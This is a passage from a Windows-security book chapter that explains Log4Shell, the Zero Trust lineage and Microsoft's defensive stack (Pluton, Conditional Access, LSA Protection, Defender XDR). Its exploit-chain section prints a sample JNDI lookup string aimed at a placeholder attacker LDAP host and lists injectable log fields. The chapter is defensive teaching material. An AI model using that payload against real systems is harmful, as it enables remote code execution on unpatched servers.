**Why a Java library belongs in a Windows-security book.** Log4Shell is not a Windows vulnerability. The bug is in Apache Log4j, a Java logging library, and the impact lands on any process that runs the affected Log4j versions and logs untrusted input. It belongs here because the most enterprise-impactful exploitation in the Windows-server-fleet population ran through Java applications hosted on Windows: Tomcat and JBoss application servers, VMware vCenter and Horizon, Atlassian Confluence and Jamf Pro on Windows hosts, Cisco enterprise products, ElasticSearch, and dozens of internal Java services running on Windows Server with embedded JREs. Microsoft's December 11, 2021 Security Blog post (with rolling updates through January 2022) documented Log4Shell exploitation against Windows-hosted Java fleets and the Defender for Endpoint detections built on top [1176]; CISA's joint advisory covered the cross-platform exposure explicitly [1177].

> **Definition, JNDI (Java Naming and Directory Interface).**
> A Java API, first standardized in 1999, that provides a uniform interface for naming and directory services. JNDI is the abstraction layer between Java application code and back-end directory implementations: LDAP, RMI, DNS, CORBA, and others. The Log4j 2.x message-pattern substitution feature evaluated `${jndi:...}` lookups by calling JNDI to resolve the named resource. If the JNDI URL pointed at an attacker-controlled LDAP server, the attacker could return a Java class reference, which the JVM would then download and instantiate: executing arbitrary code in the application process.

**The exploit chain.** Any logged string that contained a `${jndi:ldap://attacker.example/payload}` substitution caused Log4j to call out to the attacker's LDAP server. The server returned a Java class reference; the JVM dereferenced it, loaded the class over HTTP, and instantiated it. Arbitrary code execution followed under the JVM's identity. The exploitation primitive was extraordinarily compact: any place an attacker could get an attacker-controlled string into a logged event (HTTP User-Agent, X-Forwarded-For, Minecraft chat, application form fields, log-event JSON, the username field of a failed authentication) was an entry point.

![Figure: Log4Shell. The link that breaks is the evaluation of a logged data string as a JNDI directive: Log4j becomes an outbound LDAP/HTTP client, and the response is an attacker-hosted Java class the JVM loads and runs. SYSTEM-level RCE on Windows hosts where the JVM ran as SYSTEM.](diagrams/13-zero-trust-log4shell.svg)

> **Sidebar.** The Minecraft Java Edition leak vector mattered both for impact and for visibility. Java Edition's chat handler logs the messages players send. A player who typed a JNDI lookup into chat could trigger remote code execution on any server (including the player's own Minecraft client) that processed the chat through Log4j. The fastest public confirmation of the bug came not from a security researcher but from screenshots of Minecraft chat sessions, and the discovery propagated through the gaming community before the security industry had its first advisory out.

**Blast radius.** CVSS 10.0 is the maximum score the framework allows. At the same December 13 industry call, officials placed Log4Shell as affecting "hundreds of millions of devices" [1175]; the formal eight-agency joint advisory AA21-356A followed on December 22 [1177]. The number was never an audited count; it was an order-of-magnitude estimate that combined Java's installed base (the JDK shipping by the time of disclosure was on every major enterprise platform) with Log4j's adoption across the Java community (Log4j 2 is a transitive dependency of thousands of enterprise packages, often pulled in by chained dependency graphs that the application owner never explicitly chose). What the figure communicated (accurately) was that *no one knew* how many Log4j 2 instances existed in production.

**Patch cascade.** Log4j 2.15.0 (December 10) closed CVE-2021-44228 but did not fully eliminate the JNDI lookup primitive. 2.16.0 (December 13) closed CVE-2021-45046 by removing message lookups entirely. 2.17.0 (December 17) closed CVE-2021-45105, a denial-of-service in the same substitution path. 2.17.1 (December 28) closed CVE-2021-44832, an arbitrary-code-execution variant. The architectural lesson includes the "first patch did not actually fix it" story: four CVEs and four patch releases over nineteen days to fully close a single bug class. Backports to the older 2.3.x and 2.12.x branches continued into January 2022.

> **Definition, SBOM (Software Bill of Materials).**
> A formal, machine-readable inventory of the components (libraries, packages, embedded code, and dependencies) that make up a software artifact. The two dominant standards are CycloneDX (OWASP, ECMA-424) [1131] and SPDX (Linux Foundation, ISO/IEC 5962:2021) [1132]. EO 14028 made SBOM provision a federal procurement requirement [1134]; the SBOM debate the four incidents accelerated is whether SBOM data is most useful as a *prevention* tool (refusing to install software whose components fail policy) or as an *incident response* tool (answering "are we exposed?" in hours rather than weeks). Log4Shell was the first incident where the IR utility was operationally tested at scale.
>
> **Key idea.**
> Universal libraries with deep transitive-dependency footprints are the new universal attack surface. "What versions of what library are in my fleet" was a question the typical enterprise could not answer in December 2021, and that gap is what accelerated SBOM from a policy document to operational tooling.

Four incidents in thirteen months. Four assumptions broken. What were the prior-decade controls actually doing that whole time?

## Why prior art did not catch any of the four

If the prior decade had quietly elevated four assumptions to invariants, the prior-decade controls had been quietly enforcing them. Here is what each one was actually doing during 2020-2021.

**Endpoint EDR alone.** The 2018-2020 industry consensus was that endpoint detection and response, plus a SIEM, plus a security operations center, plus periodic threat hunting, constituted tractable defense-in-depth. The model worked against malware. It did not work against SUNBURST, because the binary that executed was the one EDR was specified to trust: signed by SolarWinds, on the approved publisher list, distributed via the customer's own patch-management pipeline. It did not work against ProxyLogon either, because the entry was an unauthenticated HTTPS request to a publicly reachable Exchange front-end, and the resulting web shell was an ASPX file served by `w3wp.exe` (the IIS worker process): not a malware drop. By the time EDR had behavioral telemetry on either case, the post-compromise phase was several steps along. Microsoft's own Digital Defense Report acknowledged the posture in plainer language: the industry had become competent at *finding* attackers after the fact, not at stopping them at first execution [1128].

**Perimeter VPN and Network Access Control.** The defense-in-depth posture of the 2010s assumed the inside of the corporate network was a higher-trust zone than the outside, accessed via a VPN concentrator on the boundary. BeyondCorp's 2014-2017 publication sequence had already named the assumption as architecturally wrong: the December 2014 Ward and Beyer paper [1115], the Spring 2016 Osborn et al. design-to-deployment paper [1178], the Winter 2016 Cittadini et al. access-proxy paper [1179], the Summer 2017 Peck et al. migration paper [1180], and the Fall 2017 Escobedo et al. user-experience paper [1181] together document Google's transition off the privileged-intranet assumption and onto the public internet. SolarWinds did the empirical version of the same argument. The attacker was *already inside* the privileged-intranet zone, by virtue of a trusted vendor's signed update being a legitimate inhabitant of that zone. Anything the perimeter VPN was enforcing was being enforced against a population that did not include the attacker.

**Patch Tuesday as the universal cadence.** Microsoft's Patch Tuesday cadence (the second Tuesday of every month, published at 10 AM Pacific Time) was the assumed coordination point for the entire Windows defense industry [1182]. Detection engineering, change management, scheduled-maintenance windows, and operator workflow all keyed on that monthly rhythm. Between March and August 2021, Microsoft issued multiple out-of-band emergency Exchange and Windows updates [1154,1167]. The cadence's predictability (the very property that scaled it to a global operator base) was the property that made out-of-band patches feel like emergencies. The cadence broke under load not because the model was wrong but because the model assumed the load would not arrive in a sustained burst.

> **Sidebar.** The clustering of out-of-band patches matters as a measured cadence-failure signal. Patch Tuesday absorbs routine load; it does not absorb a clustering of pre-auth RCEs in Exchange Server and Print Spooler within four months. The 2021 cluster was a stress test on the cadence itself, and one of the post-incident operator complaints (from administrators of Domain Controllers required to reboot for the July 6-7 PrintNightmare OOB) was that the cadence's monthly rhythm had been training operations teams for a different threat model than the one 2021 produced.
>
> **Callout: what the prior-art controls were actually doing.**
> All three prior-art positions (endpoint EDR, perimeter VPN, monthly patch cadence) assumed the trust boundary was knowable. EDR knew which binaries were trusted (the signed ones). The VPN knew where the boundary was (between the corporate LAN and the public internet). Patch Tuesday knew when updates would arrive (the second Tuesday of every month). The 2020-2023 cluster proved each boundary was something other than where the prior decade had placed it. The pivot was already on the shelf; it had just not yet become operative.

## Zero Trust was already on the shelf

There is a startling chronology fact here. NIST Special Publication 800-207, *Zero Trust Architecture* [1116], was published in August 2020. The Mandiant SUNBURST disclosure was December 13, 2020. Zero Trust was not a response to SolarWinds. It was the vocabulary already on the shelf when SolarWinds needed it.

**The intellectual chain.** Zero Trust is not a single document but a tradition with a thirteen-year arc. Four named milestones structure that arc.

In September 2010, John Kindervag, then at Forrester Research, published "No More Chewy Centers: Introducing the Zero Trust Model of Information Security" [1114,1183,1184]. The framing was network-segmentation-first and rhetorically unforgettable:

> **Quote.**
> "Information security professionals must eliminate the soft chewy center by making security ubiquitous throughout the network, not just at the perimeter.": John Kindervag, Forrester Research, "No More Chewy Centers," September 14, 2010

In December 2014, Rory Ward and Betsy Beyer of Google published "BeyondCorp: A New Approach to Enterprise Security" in USENIX `;login:` magazine [1115]. The paper documented Google's transition from a privileged-intranet model to one in which every internal application was reachable on the public internet and every access decision was made on the basis of authenticated user and managed-device identity. A series of further BeyondCorp papers through 2017 worked out the engineering details. BeyondCorp is a *production implementation* of Zero Trust principles; it is not "the framework," and Ward and Beyer do not claim it is.

Between 2017 and 2018, Forrester elaborated the original framing into Zero Trust eXtended (ZTX), a seven-pillar taxonomy, and Gartner introduced CARTA (Continuous Adaptive Risk and Trust Assessment) as a complementary continuous-evaluation framing. (Note: ZTX gave the framework a procurement-friendly seven-pillar map; CARTA reframed access decisions as continuous rather than session-initial. Neither produced a complete architectural specification, which is the gap NIST SP 800-207 was published to fill in August 2020.)

In August 2020, NIST published SP 800-207 [1116]. Authored by Scott Rose, Oliver Borchert, Stu Mitchell, and Sean Connelly, SP 800-207 synthesized Kindervag's framing, BeyondCorp's worked example, ZTX's taxonomy, CARTA's continuous evaluation, and federal Trusted Internet Connections (TIC) guidance into a vendor-neutral architecture. The architectural primitives the document names (Policy Decision Point, Policy Enforcement Point, Policy Engine, and Policy Administrator) become the load-bearing vocabulary for every subsequent Zero Trust treatment.

> **Definition, Zero Trust.**
> An architectural orientation that refuses the assumption of a privileged inside network and decides every access on the basis of authenticated identity, device posture, and contextual signals at the moment of access. The term was coined by John Kindervag at Forrester in September 2010 [1114]. BeyondCorp [1115] is Google's production implementation, not the framework. NIST SP 800-207 [1116] is the vendor-neutral architectural specification. The Microsoft three-principle formulation ("Verify Explicitly, Use Least Privilege, Assume Breach" [1117]) is *one* specialization of an older tradition; it is not the original.
>
> **Definition: Policy Decision Point and Policy Enforcement Point (PDP, PEP).**
> The two load-bearing primitives in NIST SP 800-207's Zero Trust architecture [1116]. The Policy Decision Point is the component that evaluates an access request against policy, user identity, device posture, and contextual signals and produces a decision. The Policy Enforcement Point is the component that intercepts the request and enforces the decision the PDP returns. In Microsoft's stack, Conditional Access [1118] can serve as the PDP implementation for covered cloud-application access decisions; the resource (Exchange Online, SharePoint, a custom app) and token-issuance path provide PEP behavior. The PDP and PEP can be co-located or remote; the architectural distinction is the one that matters.
>
> **Aside. BeyondCorp is an exemplar, not the framework.**
> A common simplification reads NIST SP 800-207 as having "formalized BeyondCorp." This is the wrong shape of the chain.
>
> NIST SP 800-207 explicitly references BeyondCorp as one production implementation of Zero Trust principles, alongside other implementations and prior architectural work. The document does not claim to be a formalization of BeyondCorp; it claims to be a vendor-neutral synthesis of multiple traditions, of which BeyondCorp is the most-cited production exemplar. The naming sequence: "Zero Trust" 2010 by Kindervag, "BeyondCorp" 2014 by Ward and Beyer, "Zero Trust Architecture" 2020 by Rose et al.: preserves the distinction.
>
> The reason this matters is that "BeyondCorp" as a brand has become shorthand inside the Google-aligned engineering community for "the Zero Trust thing," while in the federal procurement community the relevant artifact is SP 800-207 itself. When the OMB M-22-09 federal Zero Trust strategy memo [1185] cites a canonical reference, it cites SP 800-207, not BeyondCorp. The Microsoft three-principle formulation cites SP 800-207. CISA's Zero Trust Maturity Model cites SP 800-207. BeyondCorp is the worked example; SP 800-207 is the contract.

![Figure: The Zero Trust intellectual lineage. Four origin strands: Kindervag's name (2010), BeyondCorp's production exemplar (2014–17), and Forrester's ZTX taxonomy with Gartner's CARTA continuous-risk framing (2017–18): converge in NIST SP 800-207 (2020), the vendor-neutral synthesis that federal mandates and Microsoft's product guidance then operationalized.](diagrams/13-zero-trust-lineage.svg)

The Microsoft three-principle adoption (Verify Explicitly, Use Least Privilege, Assume Breach) runs through Microsoft Build 2022's Zero Trust keynote programming and through the Microsoft Learn Zero Trust overview that codifies the framing as Microsoft documentation [1117]. Federal adoption became binding in OMB M-22-09 on January 26, 2022 [1185], which required Federal Civilian Executive Branch agencies to align with SP 800-207 and the CISA Zero Trust Maturity Model by end of FY24, with phishing-resistant multi-factor authentication as the identity-pillar baseline.

> **Key idea.**
> Zero Trust is not a 2020 invention, and the SolarWinds-HAFNIUM-PrintNightmare-Log4Shell clustering is not what *created* the architecture. The vocabulary was already on the shelf in August 2020. The thirteen-month incident clustering is what made the vocabulary operative for the Windows industry: because the incident clustering invalidated four separate assumptions simultaneously, and only an architectural pivot at the perimeter-trust level addressed all four.

The vocabulary existed in August 2020. The receipt arrived in December 2020. Four Windows-side primitives operationalized it at scale.

## The defensive layer that shipped at scale (2021-2023)

Vocabulary becomes architecture only when something ships. Here are the four Windows-side primitives that operationalized Zero Trust between 2021 and 2023.

### Microsoft Pluton: The hardware boundary response

On November 17, 2020 (three weeks before Mandiant's SUNBURST disclosure) David Weston announced the Microsoft Pluton security processor [49]. The announcement named the architectural goal directly. Discrete Trusted Platform Modules sit on the LPC or SPI bus that runs between the CPU package and the motherboard chipset; the bus is observable with a logic analyzer. The 2019 Pulse Security research by Denis Andzakovic [78], the 2021 SCRT reproduction [92], and Henri Nurmi's 2022 WithSecure Labs SPI follow-up [91] had all demonstrated that the BitLocker Volume Master Key transiting that bus was extractable with a forty-dollar FPGA. Pluton's architectural answer was to eliminate the bus. Place the security processor *inside* the CPU package, and the BitLocker key never traverses an externally observable trace.

> **Sidebar.** Pluton is not a 2020 design. The same Microsoft Security and Pluton team shipped its first production silicon on the Xbox One in 2013, where the security processor was the anti-piracy and DRM key-storage root of trust. Galen Hunt's team then shipped a Pluton-derived security subsystem on Azure Sphere MCUs from April 2018, where it served as the secure-boot, runtime-attestation, and Microsoft-managed-firmware-update root for the IoT-microcontroller class [140]. The November 2020 announcement [49] was the commitment to ship a mature security-processor design on general-purpose Windows PCs, not a new design.
>
> **Definition, Microsoft Pluton.**
> A security processor co-designed by Microsoft, AMD, Intel, and Qualcomm, announced in November 2020 [49] and shipped commercially in May 2022 on Lenovo ThinkPad Z13 and Z16 systems with AMD Ryzen 6000 SoCs: the Lenovo StoryHub press release confirms the ship vehicle ("ThinkPad Z13 will be available from May 2022, starting from $1549" and "ThinkPad Z16 will be available from May 2022, starting from $2099"), and David Weston's CES 2022 Microsoft Windows Experience Blog post the same day names the same Pluton-on-Ryzen-6000 ThinkPad Z ship vehicle [1186,1187]. Pluton can operate in three modes: as a TPM 2.0 implementation co-resident on the CPU die (the default on consumer Windows 11 systems where Pluton is enabled), as a security processor alongside a separate discrete TPM, or disabled at the OEM level [6]. The architectural goal is to close the TPM bus-sniffing class by eliminating the external bus, not to add new cryptographic capability beyond what TPM 2.0 already specifies.

![Figure: Discrete TPM versus Pluton: the LPC or SPI bus is the exposure point that Pluton eliminates by integrating the security processor inside the CPU package.](diagrams/tpm-vs-pluton-topology.svg)

> **Callout. Pluton present is not Pluton enabled.**
> Matthew Garrett's April 2022 analysis of an AMD Ryzen 6000 firmware image documented that the PSP directory entry 0xB, bit 36, is an OEM-controlled toggle that disables Pluton at the firmware level [130]. Garrett's analysis confirmed Pluton silicon was present on his test machine and could be disabled by the OEM, not by the end user. The architectural implication is that "the system has a Pluton" and "Pluton is enabled and acting as the TPM" are independent claims, and an enterprise threat model that turns on the latter needs verification, not inference from the former.

The framing the Pluton announcement made explicit is the one that matters in the context of this chapter. Pluton is a *hardware-packaging* response to one supply-chain-adjacent exposure: a discrete TPM can protect cryptographic identity while still leaking key material across an observable LPC or SPI bus. Pluton closes that particular leak point by collapsing the packaging boundary. It does not close the software build-pipeline class that SUNBURST exemplified; the analogy is that both incidents force defenders to ask where the trust boundary actually sits, not that one primitive solves the other class. The fact that the announcement landed three weeks before SUNBURST is coincidence; the fact that the two events name boundary-placement failures at different layers is not.

### The Windows 11 hardware baseline

Windows 11 reached general availability on October 5, 2021 [66]. The new install gate required TPM 2.0 and UEFI Secure Boot [1188]: the first mainstream Microsoft operating system to require hardware roots of trust as a precondition for installation. The Windows installer verifies both at the install screen and refuses to proceed on systems that lack them.

> **Sidebar.** The registry workaround at `HKLM\SYSTEM\Setup\MoSetup\AllowUpgradesWithUnsupportedTPMOrCPU` allows installation on systems with TPM 1.2 or an unsupported CPU model, but only as an in-place upgrade and only with explicit warning that the configuration is unsupported. The workaround is not part of the official install path; it documents the existence of an escape hatch without endorsing it. The architectural claim ("Windows 11 requires TPM 2.0 by official policy") is the operative one for fleet management.

The baseline does not eliminate the bootkit class. BlackLotus, disclosed in 2023, exploited CVE-2022-21894 to defeat Secure Boot on systems that had not patched the underlying bootloader vulnerability [1]. The hardware-root-of-trust install gate is a baseline, not a ceiling. What it accomplishes architecturally is a population-level shift: by mid-2024, the median Windows 11 installation has a TPM, has Secure Boot enabled, and has measured boot data that VBS-based defenses (Credential Guard, HVCI) can layer on top of. Credential Guard in particular reached default-enabled status on hardware that meets the requirements in Windows 11 22H2 [1126].

### Conditional Access, CAE, and the Primary Refresh Token

The cloud-identity defense stack is the primitive that the four incidents most directly produced. Three components compose it, with explicit period-correct naming.

> **Definition, Conditional Access.**
> Microsoft's policy-evaluation service for many Microsoft Entra ID (formerly Azure AD) access decisions [1118]. A Conditional Access policy is an if-then statement that takes signals (user identity, group memberships, device compliance state, location, sign-in risk score, application being accessed) and produces an enforcement decision (allow, require multi-factor, require compliant device, block). In NIST SP 800-207 terms, Conditional Access can serve as a Microsoft implementation of the Policy Decision Point for covered cloud-application decisions; the token-issuance path and the resource's own enforcement logic supply Policy Enforcement Point behavior. The architectural roles remain vendor-neutral; this is one product realization of them.
>
> **Definition: Continuous Access Evaluation (CAE).**
> The mechanism by which a resource server can be informed mid-session that the user's risk state has changed and the existing access token should be re-evaluated [124]: Microsoft's first-party predecessor to, and later standards-aligned analog of, the OpenID Continuous Access Evaluation Profile (CAEP) [1189]. CAE answers the standing-token weakness Zero Trust creates: a token issued under good conditions otherwise stays valid until expiry even after those conditions change. Its critical-event model, propagation timing, and supported relying parties are developed in full in the next chapter (Chapter 27).
>
> **Definition: Primary Refresh Token (PRT).**
> A long-lived authentication artifact issued by Microsoft Entra ID to first-party token brokers on Microsoft Entra joined and hybrid-joined devices [683]. The PRT enables single sign-on across the applications used on those devices. On TPM-enabled devices, the associated session key can be protected by the TPM so the broker proves possession from that device rather than exporting reusable key material. That strengthens device binding for Conditional Access, but it is not itself a proof of current compliance, clean runtime state, user intent, or resource-side enforcement; those claims require the tenant device object, management-compliance signal, sign-in-log evaluation, and resource behavior to line up. (The PRT's full token anatomy and the pass-the-PRT attack are developed in the Pass-the-Hash to Pass-the-PRT chapter, Chapter 19.)
>
> **Sidebar.** The "Azure AD" to "Microsoft Entra ID" rename history matters for citations and for tooling. Azure AD was the canonical name through July 11, 2023; the Microsoft Entra family umbrella was introduced on May 31, 2022 (Vasu Jakkal's Microsoft Security Blog post "Secure access for a connected world, meet Microsoft Entra" naming Azure AD, Cloud Infrastructure Entitlement Management, and decentralized identity as the initial family members [1190]) but applied only to specific product families at that point; the Azure AD-to-Entra ID rename was July 11, 2023 [1191]. Documentation written in 2021-2022 uses "Azure AD" throughout; documentation written after July 2023 uses "Microsoft Entra ID" throughout. Both names refer to the same product.

![Figure: Conditional Access, CAE, and the PRT: the cloud-identity decision loop with the NIST SP 800-207 roles named. The PRT strengthens device binding with TPM-protected key material where available; Conditional Access implements the Policy Decision Point role for covered Microsoft Entra decisions; token issuance and the resource server provide Policy Enforcement Point behavior; and Continuous Access Evaluation feeds critical events and policy changes back before ordinary token expiry.](diagrams/13-zero-trust-conditional-access.svg)

Together, the three primitives operationalize the Zero Trust framing in the Microsoft cloud-identity layer. Conditional Access supplies a PDP implementation for covered decisions; CAE keeps supported sessions sensitive to selected events after the initial sign-in; the PRT with TPM-protected key material makes the device-identity signal harder to replay, while still leaving compliance, runtime state, user intent, and resource enforcement as separate claims. Microsoft Entra ID Protection layers risk-based signal-scoring on top, with detections for anomalous tokens, atypical travel patterns, and suspicious multi-factor approval flows [1192]. The PRT's theft-and-replay model is the subject of Chapter 19 (Pass-the-Hash to Pass-the-PRT), and post-issuance re-evaluation is the subject of Chapter 27 (Continuous Access Evaluation); this chapter treats both only as the floor beneath the device-trust signal.

## Proof on a live machine

There is no captured VM evidence block for this chapter. The proof surfaces below are therefore deliberately 🔵 **DOCUMENTED**: real Windows, Microsoft Entra, and Microsoft Graph surfaces a reader can inspect, with expected fields from Microsoft documentation. The examples are expected shapes, not captured tenant output.

> 🔵 **DOCUMENTED**: Microsoft Learn, *Troubleshoot devices by using the dsregcmd command* ·
> reproduce: `dsregcmd /status`

```text
+----------------------------------------------------------------------+
| Device State                                                         |
+----------------------------------------------------------------------+
             AzureAdJoined : YES
          EnterpriseJoined : NO
              DomainJoined : YES
                DomainName : HYBRIDADFS

+----------------------------------------------------------------------+
| Device Details                                                       |
+----------------------------------------------------------------------+
                  DeviceId : 00aa00aa-bb11-cc22-dd33-44ee44ee44ee
                Thumbprint : AA11BB22CC33DD44EE55FF66AA77BB88CC99DD00
 DeviceCertificateValidity : [ <UTC start> -- <UTC end> ]
            KeyContainerId : 00aa00aa-bb11-cc22-dd33-44ee44ee44ee
               KeyProvider : Microsoft Platform Crypto Provider
              TpmProtected : YES
          DeviceAuthStatus : SUCCESS

+----------------------------------------------------------------------+
| SSO State                                                            |
+----------------------------------------------------------------------+
                AzureAdPrt : YES
       AzureAdPrtUpdateTime : <UTC timestamp of last PRT update>
       AzureAdPrtExpiryTime : <UTC timestamp when PRT expires if not renewed>
        AzureAdPrtAuthority : <https://login.microsoftonline.com/><tenant-id>
```

Read the block as three claims, not one. `AzureAdJoined` or hybrid join says the machine is known to Entra. `DeviceId` is the correlation key you should find in the tenant. The certificate and key-container fields are the local device-authentication surface. `TpmProtected: YES` says Windows reports the device private key as TPM-protected. `AzureAdPrt: YES` says the current user has the SSO artifact through which Windows can request cloud tokens. The block does **not** prove that the device is currently compliant, nor that Conditional Access allowed a particular request. That proof lives in the cloud logs [1119].

> 🔵 **DOCUMENTED**: Microsoft Graph, `signIn`, `deviceDetail`, and `appliedConditionalAccessPolicy` resource types ·
> reproduce: Microsoft Graph `GET /auditLogs/signIns?$top=1` or Entra admin center → Sign-in logs → add device and Conditional Access columns

```json
{
  "conditionalAccessStatus": "success",
  "appliedConditionalAccessPolicies": [
    {
      "displayName": "<policy display name>",
      "enforcedGrantControls": ["<grant control such as Require compliant device>"],
      "enforcedSessionControls": [],
      "result": "success"
    }
  ],
  "deviceDetail": {
    "deviceId": "00aa00aa-bb11-cc22-dd33-44ee44ee44ee",
    "displayName": "<device display name>",
    "isCompliant": true,
    "isManaged": true,
    "operatingSystem": "Windows",
    "trustType": "AzureAd"
  }
}
```

Microsoft Graph documents `conditionalAccessStatus` on the sign-in object, the applied Conditional Access policy collection with policy `result` and enforced controls, and `deviceDetail` fields including `deviceId`, `isCompliant`, `isManaged`, `operatingSystem`, and `trustType` [1193], [1120], [1194]. This is the cloud side of the chain: the same `DeviceId` seen locally should be the device the sign-in log evaluated, and `isCompliant: true` is the management assertion a “require compliant device” policy consumed.

The related policy surfaces to inspect are structural rather than a separate evidence block: Entra admin center → Protection → Conditional Access → Policies, plus the sign-in details for grant controls, session controls, and CAE-aware resources. A Reasoner should confirm policy state (`On`, `Report-only`, or `Off`), assignments, target resources, conditions, grant controls such as MFA or compliant-device requirements, and session controls such as sign-in frequency or app-enforced restrictions. Conditional Access is policy; its proof is not a single command but a join between local device state, sign-in-log evaluation, and resource support. Demand all three before claiming “device trust reached the cloud.”

### LSA Protection and the vulnerable driver blocklist

The fourth Windows-side primitive is the pair of defaults that landed in 2022-2023 against credential-theft and bring-your-own-vulnerable-driver attacks respectively.

> **Definition: RunAsPPL / LSA Protection.**
> A Windows mechanism, introduced as an opt-in feature on Windows 8.1 and Windows Server 2012 R2 [436], that runs the Local Security Authority subsystem (`lsass.exe`) as a Protected Process Light. The PPL status prevents non-PPL processes (including those running as SYSTEM) from opening LSASS with the access rights required for memory inspection or code injection. Mimikatz-style credential extraction (Chapter 14, Mimikatz) from LSASS memory becomes unavailable to malware running outside the PPL trust level. The Microsoft Learn Windows 11 Security Book confirms the current default behavior: "LSA protection is enabled by default on all devices to help safeguard credentials. For new installations, it activates immediately. For upgrades, it becomes active after a five-day evaluation period followed by a system reboot" [1195]: the audit-then-enforce rollout pattern that turned the opt-in 2013-era control into a default-on Windows 11 22H2 primitive; upgraded systems and systems flagged as incompatible remain opt-in.
>
> **Definition, BYOVD (Bring Your Own Vulnerable Driver).**
> An attack pattern in which the attacker installs a *legitimately signed* third-party kernel driver that contains a known vulnerability, then exploits the driver's vulnerability to obtain kernel-mode code execution. The attacker thereby converts a userspace foothold into a kernel-mode foothold without writing kernel code that would have to pass Microsoft's signing process. The Vulnerable Driver Blocklist [1196] is Microsoft's curated list of drivers known to be exploitable for BYOVD; Microsoft's KB5020779 (titled "The vulnerable driver blocklist after the October 2022 preview release") states explicitly that "Starting with Windows 11, version 22H2, the blocklist is also enabled by default on all devices" [382], anchoring both the October 2022 servicing milestone and the 22H2 default-on rollout. Community catalogs like LOLDrivers [385] track the broader population.

The defaults matter precisely because the opt-in posture from 2013 onward did not produce population-level coverage. LSA Protection had been available for nine years before it shipped as a default; Vulnerable Driver Blocklist was available as a WDAC policy for several years before the default. The change in 2022-2023 is not the existence of the controls but the population they cover by default. Windows 11 22H2 fleets in 2024-2026 are the first Windows population in which a meaningful fraction of installs are LSA-Protected at sign-in and blocking the canonical BYOVD drivers at kernel-load time, on the default install path, without an administrator having configured the feature.

These four primitives: Pluton at silicon, the Windows 11 hardware baseline at the OS install gate, Conditional Access with CAE and PRT at the cloud-identity layer, LSA Protection and Vulnerable Driver Blocklist as defaults on the endpoint. Are coherent if and only if they are layered. The fifth primitive, the Defender XDR composition plane, is what *makes* them layerable in practice.

### Microsoft Defender XDR: The composition primitive

No single Defender product covers the full attack chain of any of the four 2020-2023 incidents. SUNBURST touches the endpoint, on-premises Active Directory, ADFS, and Microsoft 365 in sequence. ProxyLogon touches the IIS worker process, the file system, and downstream Exchange mailboxes. PrintNightmare touches the Spooler RPC interface on a Domain Controller. Log4Shell touches a Java application's process tree on Windows. The detection telemetry for each lives in a different product surface.

> **Definition: Microsoft Defender XDR.**
> The unified incident-correlation and advanced-hunting plane that consolidates four product-level Defender products into a single security operations surface at `security.microsoft.com`. The four products are Microsoft Defender for Endpoint (workstation and server EDR), Microsoft Defender for Identity (on-premises Active Directory and ADFS detection) [803], Microsoft Defender for Cloud Apps (cloud-session anomaly detection) [1197], and Microsoft Defender for Office 365 (email and collaboration phishing detection). XDR contributes three primitives the individual products cannot provide on their own: a common Kusto Query Language advanced-hunting schema across the four telemetry streams, incident correlation that groups alerts across products into a single cross-domain incident, and Automated Investigation and Response playbooks that span product boundaries.

The architectural role of each product against the chapter's incident set is specific.

**Defender for Identity** sources from Domain Controller event streams and from ADFS event logs. Its load-bearing detections against the SolarWinds-class follow-on are the SACL-based DCSync detection (which audits the three Directory-Replication-Get-Changes extended-rights GUIDs against AD event 4662 for non-DC principals) and the Golden SAML composite signal, which fuses an ADFS-anomaly alert with a downstream cloud-session anomaly and an Entra ID Protection risk-score elevation into a single correlated incident [803]. The on-premises attack and the cloud-side forged-token consequence get joined in one investigation rather than two.

**Defender for Endpoint** carries the canonical ProxyLogon-class fingerprint: the IIS worker process `w3wp.exe` spawning `cmd.exe`, `powershell.exe`, `cscript.exe`, or `bitsadmin.exe` as a direct child [1198]. The fingerprint generalizes beyond Exchange. The same parent-child pattern is the canonical web-shell pivot for ProxyShell against Exchange Server, for OGNL injection against Atlassian Confluence, and for any Java application-server exploitation against Tomcat on Windows in which the post-exploitation step drops a shell. One detection rule, multiple incident classes.

**Defender for Cloud Apps** runs the anomaly-detection plane against cloud sessions [1197]. The seven-day learning window builds a per-user behavioral baseline; subsequent sessions are scored against the baseline across impossible-travel, geographic deviation, device-fingerprint deviation, claim-set deviation, and token-lifetime deviation axes. The architectural significance against Storm-0558-class incidents is precisely that the cryptographic verification path will (by definition) accept a token forged with a stolen signing key, so the catch has to happen at the behavioral layer rather than the signature layer. Defender for Cloud Apps is the heuristic anomaly net under the cryptographic floor.

**Defender for Office 365** runs the upstream-vector layer for email and collaboration spearphishing: the operator-pre-exploitation phase common to SolarWinds-class and HAFNIUM-class operations where the actor builds initial reconnaissance and credential access before reaching the production network. Its role in the chapter's incident set is preventive rather than detective: closing the recon entry path before the lateral-movement phase has a chance to begin.

![Figure: Defender XDR as the composition primitive. Four product-level Defenders (Endpoint, Identity, Cloud Apps, Office 365) feed one common KQL advanced-hunting and incident-correlation plane that joins four separately triaged alerts into a single cross-domain incident, which can in turn trigger Automated Investigation and Response playbooks spanning product boundaries.](diagrams/13-zero-trust-defender-xdr.svg)

The canonical example of why XDR is the composition primitive is a telemetry-correlation model for the SUNBURST follow-on phase, not a guarantee that every tenant will see this exact alert quartet. In a well-instrumented Microsoft stack, the same intrusion can plausibly leave a Defender for Endpoint network-beacon signal on the Orion server, a Defender for Identity ADFS credential-access or token-signing-key signal on the federation host, a Defender for Cloud Apps anomalous-session signal when a forged token reaches a cloud resource, and an Entra ID Protection risk signal on the downstream sign-in. Four product-level telemetry streams. One real incident. Without the correlation plane, the alerts arrive as separately triaged tickets; with it, they can arrive as one investigation.

The architecture lands on a structural necessity. No 2020-2021 incident is *covered* by one of the five primitives alone. The 2022-2023 step forward is that all five primitives ship at scale; the load-bearing architectural argument is that none of them is sufficient in isolation. Three competing architectural positions determine *how* they are layered in practice.

## Three live Zero Trust operating models

There is not one Zero Trust deployment pattern in 2024-2026. There are three common operating models, and they are not interchangeable. NIST SP 800-207 is the architecture; CISA ZTMM is a maturity model; the Microsoft and best-of-breed patterns below are procurement and integration choices that instantiate those ideas differently. Each closes a different gap; none closes all three.

